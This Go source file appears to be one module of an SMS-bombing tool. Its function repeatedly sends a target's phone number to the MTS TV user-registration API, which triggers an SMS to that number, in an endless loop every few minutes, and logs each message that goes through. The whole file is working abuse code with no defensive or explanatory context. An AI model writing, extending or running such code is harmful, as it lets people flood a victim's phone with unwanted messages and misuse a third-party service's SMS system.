package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func mtstv() {
	req := newreq()
	req.SetBodyString("msisdn=" + num)
	req.SetRequestURI("https://api.mtstv.ru/v1/users")
	req.Header.SetMethod("POST")

	timeout := time.Minute*3 + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"meta":{"status":201}`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
